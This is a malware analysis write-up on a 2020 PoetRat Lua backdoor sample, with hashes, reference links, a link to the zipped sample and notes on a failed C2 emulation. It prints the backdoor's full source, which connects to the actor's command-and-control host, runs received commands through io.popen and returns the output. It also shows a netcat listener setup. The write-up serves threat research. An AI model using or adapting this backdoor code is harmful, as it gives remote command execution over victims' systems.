# PoetRat 2020-10-09

This sample is attributed to PoetRat via 
[Xxx_8885](https://twitter.com/Xxx_8885/status/1314752315157483520?s=20) and 
[Shadow Chaser Group](https://twitter.com/ShadowChasing1/status/1314847032155074562?s=20) and is a continuation of the 
Lua version found in [bb6c57f1131358f4bb8a38c942b2f554](PoetRAT/bb6c57f1131358f4bb8a38c942b2f554/README.md)

# TL;DR
PoetRat continues to progress their Lua based backdoor, still with no use of TLS, but introduce threading.

# Table Of Contents 
1. [References](#references)
    1. [Hashes](#hashes)
    1. [Writeups](#writeups)
    1. [Sample Source](#sample-source)
1. [Maldoc Dropper](#maldoc-dropper)
1. [Payload](#payload-analysis)
    1. [Execution](#execution)
    1. [bolt.lua](#boltlua)
        1. [boo Function](#boo-function)
        1. [sleep and comm function](#sleep-and-comm-functions)
1. [C2 Emulation](#c2-emulation)
    1. [Malware Modification](#malware-modification)
    1. [C2 Emulation Setup](#c2-emulation-setup)
    1. [Completed Emulation](#completed-emulation)
        
# References
## Hashes
|algo|hash|
|----|----|
|md5|7a4835d18f35b1b4fd87099c3b31562c|
|sha1|1bea0c00a60bf4b11501bb0803ebe5b5144a5f8e|
|sha256|c6ca47944f09ddbb6ac4ce96fdfb2818c7db7aca589ee202e9c33dd005eb0cf2|

## Writeups
[Cisco Talos Oct 2020](https://blog.talosintelligence.com/2020/10/poetrat-update.html) -- [Archive Link](https://web.archive.org/web/20201010004915/https://blog.talosintelligence.com/2020/10/poetrat-update.html)  
[Shadow Chaser Group](https://twitter.com/ShadowChasing1/status/1314847032155074562?s=20)  
[Xxx_8885](https://twitter.com/Xxx_8885/status/1314752315157483520?s=20)

## Sample Source
[Any.run](https://app.any.run/tasks/819ac608-a4d0-4492-97e5-92e6ace11da6/)  
[VirusTotal](https://www.virustotal.com/gui/file/c6ca47944f09ddbb6ac4ce96fdfb2818c7db7aca589ee202e9c33dd005eb0cf2/details)


# Maldoc Dropper
TODO

# Payload Analysis
Payload was found as a zip file being writen to disk.    
![](images/payload_zip.png)  

[unravel.zip.zip](malware_lives_here/unravel.zip.zip) - password `infected`

## Execution 
After the payload is unzipped, we can see the lua script being started via the lua binary.

![](images/execution.png)

## `bolt.lua`
Looking at `bolt.lua`, it appears to be a another simple Lua based backdoor.

### `boo` function
Here we can see the actor has started to use threading for the commands that are executed.
```lua
function boo()
	--Connecting to 
	sleep(300)
	local host, port = 'volt220.kozow.com', 443
	--=============================	
	local socket = require('socket') 
	--=============================	
	local tcp = socket.tcp() 
	--=============================	
	--=============================	
	tcp:connect(host, port); 
	--=============================	
	local thread = require('thread')	
	while true do 
		local e = thread.event(false)
		local t_c = 800
		local res = "the command took too long\n"
		local t = 0.1
		local status = 'fucked'
		local cmd, status, partial = tcp:receive()
		local th = thread.new(comm, cmd, e)
		--=============================	
		while t_c > 0 do
			if e:isset() then 
				res = th:join()
				break
			end
			t_c = t_c - 1
			sleep(t)
		end
		tcp:send(res)
		if status == 'closed' then break end 
	end 
	--=============================	
	tcp:close()
end

while true do 
    pcall(boo) 
end
```

### `sleep` and `comm` functions
`comm` function is responsible for running the commands the and returning the results back to the thread from the `boo` 
function
```lua
function sleep(sec)
	socket = require "socket"
    socket.select(nil, nil, sec)
end

function comm(cmd, e)
	local io = require('io') 
	--=============================	
	local f = io.popen(cmd, 'r') 
	--=============================	
	local s = f:read('*a')
	--=============================	
	f:close() 
	--=============================	
	e:set()
	return s
end
```

# C2 Emulation
Again, we just modify the c2 in the lua script to connect to a netcat listener and see if we can get some commands 
to run.  During testing, it was observed that due to the `while true do pcall(boo) end` contained within `bolt.lua` the 
`sleep(300)` becomes very important.  Without the sleep, the lua script will make endless connections as the `boo` 
function is called continuously.

## Malware Modification
```lua
function boo()
	--Connecting to 
	sleep(300)
---	local host, port = 'volt220.kozow.com', 443
	local host, port = '127.0.0.1', 443
	--=============================	
```
Start the Malware
```bash
$ lua.cmd bolt.lua
```
## C2 Emulation Setup
```bash
$ ncat -l 443
```

## Completed Emulation
I failed to get a full C2 emulation.  There appears to be an issue in my analysis vm as it relates to the importing of 
threading modules.   

When running the malware, I can see the tcp connection being made, but no thread is started.  Upon investigation, 
`bolt.lua` requires the thread module, `local thread = require "thread"`, which in turn attempts to load the 
pthread.lua module `local pthread = require'pthread'`.  However, _something_ (unknown to me) seems to fail when pthread
makes this call `local C = ffi.load(lib)`

